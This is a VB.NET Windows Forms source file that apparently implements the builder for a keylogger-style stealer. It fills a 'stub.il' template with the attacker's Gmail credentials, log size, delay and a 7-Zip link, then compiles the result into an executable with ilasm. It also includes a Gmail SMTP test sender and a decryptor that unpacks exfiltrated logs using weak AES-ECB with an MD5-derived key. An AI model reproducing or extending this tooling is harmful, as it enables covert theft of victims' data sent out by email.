Imports System.Net.Mail

Public Class Form1

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        OpenFileDialog1.Title = "Please select a Text file"
        OpenFileDialog1.InitialDirectory = "Desktop"
        OpenFileDialog1.Filter = "Text Files|*.txt"

        If OpenFileDialog1.ShowDialog() = DialogResult.OK Then
            TextBox1.Text = OpenFileDialog1.FileName
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Using AES As New Security.Cryptography.RijndaelManaged
            Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(TextBox2.Text))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim d As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim b = Convert.FromBase64String(My.Computer.FileSystem.ReadAllText(TextBox1.Text))

            FolderBrowserDialog1.SelectedPath = "Desktop"
            If FolderBrowserDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
                Try
                    Label12.Text = FolderBrowserDialog1.SelectedPath
                    My.Computer.FileSystem.WriteAllBytes(FolderBrowserDialog1.SelectedPath & "\" & "temp" & ".7z", d.TransformFinalBlock(b, 0, b.Length), False)
                    My.Computer.FileSystem.WriteAllText("7temp.bat", "@echo off" & vbNewLine & "7za e " & FolderBrowserDialog1.SelectedPath & "\" & "temp" & ".7z -o" & FolderBrowserDialog1.SelectedPath & vbNewLine & "pause", False)
                    Process.Start("7temp.bat").WaitForExit()
                    If My.Computer.FileSystem.FileExists("7temp.bat") Then
                        My.Computer.FileSystem.DeleteFile("7temp.bat")
                    End If
                    If My.Computer.FileSystem.FileExists(FolderBrowserDialog1.SelectedPath & "\" & "temp" & ".7z") Then
                        My.Computer.FileSystem.DeleteFile(FolderBrowserDialog1.SelectedPath & "\" & "temp" & ".7z")
                    End If
                    MsgBox("Saved archive successfully !!!")
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If
        End Using
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("https://myaccount.google.com/lesssecureapps")
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Dim Mail As New MailMessage With {
            .Subject = TextBox7.Text
        }
        Mail.To.Add(TextBox9.Text & "@gmail.com")
        Mail.From = New MailAddress(TextBox9.Text & "@gmail.com")
        Mail.Body = TextBox6.Text
        Try
            Using SMTP As New SmtpClient("smtp.gmail.com") With {
            .EnableSsl = True,
            .Credentials = New Net.NetworkCredential(TextBox9.Text & "@gmail.com", TextBox8.Text),
            .Port = "587"
        }
                SMTP.Send(Mail)
            End Using
            MsgBox("Message sent successfully, Please check your inbox.")
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim a = Nothing
        If ComboBox1.Text = "KiloBytes" Then
            a += 1000
        ElseIf ComboBox1.Text = "MegaBytes" Then
            a += 1000000
        End If
        Dim SevenZip = TextBox5.Text
        Dim Logsize = TextBox4.Text * a
        If Logsize > 50000000 Then
            MsgBox("Gmail doesn't allow you post file greater than 50MB. Please decrease the value of Logsize.")
        End If

        Dim email = TextBox9.Text & "@gmail.com"
        Dim password = TextBox8.Text
        Dim subject = TextBox7.Text
        Dim body = TextBox6.Text
        Dim delay = TextBox11.Text
        Dim fs = Replace(My.Computer.FileSystem.ReadAllText("stub.il"), "[7zipLink]", SevenZip)
        Dim gs = Replace(fs, "[LogSize]", Logsize)
        Dim hs = Replace(gs, "[email]", email)
        Dim js = Replace(hs, "[password]", password)
        Dim ks = Replace(js, "[body]", body)
        Dim ss = Replace(ks, "[subject]", subject)
        Dim qs = Replace(ss, "[delay]", delay)
        If My.Computer.FileSystem.FileExists("temp.il") Then
            My.Computer.FileSystem.DeleteFile("temp.il")
        End If
        If My.Computer.FileSystem.FileExists("temp.bat") Then
            My.Computer.FileSystem.DeleteFile("temp.bat")
        End If
        My.Computer.FileSystem.WriteAllText("temp.il", qs, False)
        Dim path
        If RadioButton1.Checked Then
            path = Environ("windir") & "\Microsoft.NET\Framework\v4.0.30319\ilasm.exe"
        ElseIf RadioButton2.Checked Then
            path = Environ("windir") & "\Microsoft.NET\Framework\v2.0.50727\ilasm.exe"
        ElseIf RadioButton3.Checked Then
            path = TextBox12.Text
        End If
        SaveFileDialog1.InitialDirectory = "Desktop"
        SaveFileDialog1.Filter = "Executable Files|*.exe"
        If SaveFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
            Try
                My.Computer.FileSystem.WriteAllText("temp.bat", "@echo off" & vbNewLine & path & " temp.il /NOLOGO /FOLD /OPTIMIZE /OUTPUT=""" & SaveFileDialog1.FileName & """" & vbNewLine & "pause", False)
                Process.Start("temp.bat").WaitForExit()
                If My.Computer.FileSystem.FileExists("temp.bat") Then
                    My.Computer.FileSystem.DeleteFile("temp.bat")
                End If
                If My.Computer.FileSystem.FileExists("temp.il") Then
                    My.Computer.FileSystem.DeleteFile("temp.il")
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub
    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If Not CheckBox1.Checked Then
            TextBox11.ReadOnly = True
        Else
            TextBox11.ReadOnly = False
        End If
    End Sub
    Private Sub RadioButton3_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton3.CheckedChanged
        If RadioButton3.Checked Then
            TextBox12.Enabled = True
            Label11.Enabled = True
        Else
            TextBox12.Enabled = False
            Label11.Enabled = False
        End If
    End Sub

    Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Process.Start("https://dotnet.microsoft.com/download/dotnet-framework")
    End Sub
End Class
